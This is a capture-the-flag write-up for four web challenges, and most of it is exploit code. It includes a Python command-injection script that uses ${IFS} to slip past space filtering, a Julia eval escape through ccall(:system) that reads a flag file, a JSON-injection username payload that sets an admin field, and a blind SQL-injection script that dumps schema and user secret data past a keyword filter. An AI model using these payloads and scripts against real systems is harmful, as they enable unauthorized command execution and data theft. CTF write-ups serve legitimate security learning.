## Destiny (140pts)
1. Command Injection, replace `%20` with `${IFS}`
```
import requests as req
from bs4 import *

def main(cmd):
    cmd = cmd.replace(" ", "${IFS}")
    x = 1    
    while True:
        res = req.post("http://103.41.207.206:13005/who", data={'domain':"|" + cmd + "|head${IFS}-n${IFS}"+ str(x) + "|tail${IFS}-n${IFS}1"}).text
        # print(cmd + "|head${IFS}-n${IFS}"+ str(x) + "|tail${IFS}-n${IFS}1")
        bs_curr = BeautifulSoup(res, 'html.parser').find("input").get("placeholder")
        c = 0
        print(bs_curr)
        for y in range(1, 6):
            next_res = req.post("http://103.41.207.206:13005/who", data={'domain':"|" + cmd + "|head${IFS}-n${IFS}"+ str(x+y) + "|tail${IFS}-n${IFS}1"}).text
            bs_next = BeautifulSoup(next_res, 'html.parser').find("input").get("placeholder")
            
            if bs_next == bs_curr:
                c += 1
            if c == 5:
                return 1        
        x += 1
    
if __name__ == '__main__':
    while True:
        main(input("$> "))
```

## Jinnytty (440pts)
1. Seems like `eval` application
2. Application written with julia language
3. use `ccall` to execute shell
4. `first(walkdir("."))` for enumerating directory
4. `ccall(:system, String, (Cstring,), "cat add_a_little_difficulty_by_renaming_flag_dot_txt_to_this_gibberish > /tmp/\$(cat add_a_little_difficulty_by_renaming_flag_dot_txt_to_this_gibberish)")` for creating a file with the value of flag.
5. `first(walkdir("/tmp"))` for getting the flag

## TodayManjGang (420pts)
1. found snippet source code in images
2. its JSON injection, then we replacing the value of `touman_leader` to `1`
3. set username to ``nyxsorcerer\",\"touman_leader\":\"1``

## Fakeuser (177pts)
1. SQL Injection with some of filter
`or and union admin where >< ; --`
2. alternative 
`or -> ||`
3. Use scripting for Blind SQL Injection

exp.py
```
import requests as req
import string

s = string.printable[:-6].replace("'", "").replace('"', '').replace("\\", '').replace("%", "")

'''
Sorry if its really mess and buggy >_<
'''

def table_column():
    count_row = 0
    while True:
        found, count_char = 1, 1
        val, st, tmp = "", "", ""
        while True:
            for st in s:
                tmp = val + st
                pay = f"'||left((select concat(column_name,0x3a,table_name) from information_schema.columns limit {count_row},1),{count_char})=binary '{tmp}'||'"
                r = req.post("http://103.41.207.206:13003/", data={"username":"", "password":f"{pay}", "submit":"Login"}).text
                # print(pay)
                if len(r) > 29:
                    val += st
                    found = 1
                    print(val)
                    break
                c = 0
                for x in range(1, 4):
                    pay = f"'||left((select concat(column_name,0x3a,table_name) from information_schema.columns limit {count_row},1),{count_char+x})=binary '{tmp}'||'"
                    r_n = r = req.post("http://103.41.207.206:13003/", data={"username":"", "password":f"{pay}", "submit":"Login"}).text
                    if r_n == r:
                        c += 1
                    if c == 3:
                        found = 0
            if found == 0:
                print("change row")
                count_row += 1
                break
            count_char += 1

def data(table, column):
    count_row = 1
    while True:
        found, count_char = 1, 1
        val, st, tmp = "", "", ""
        while True:
            for st in s:
                tmp = val + st
                pay = f"'||left((select {column} from {table} limit {count_row},1),{count_char})=binary '{tmp}'||'"
                r = req.post("http://103.41.207.206:13003/", data={"username":"", "password":f"{pay}", "submit":"Login"}).text
                # print(pay)
                if len(r) > 29:
                    val += st
                    found = 1
                    print(val)
                    break
                c = 0
                for x in range(1, 4):
                    pay = f"'||left((select {column} from {table} limit {count_row},1),{count_char+x})=binary '{tmp}'||'"
                    r_n = r = req.post("http://103.41.207.206:13003/", data={"username":"", "password":f"{pay}", "submit":"Login"}).text
                    if r_n == r:
                        c += 1
                    if c == 3:
                        found = 0
            if found == 0:
                print("change row")
                count_row += 1
                break
            count_char += 1

if __name__ == '__main__':
    # table_column()
    data("user", "secretdata")
```
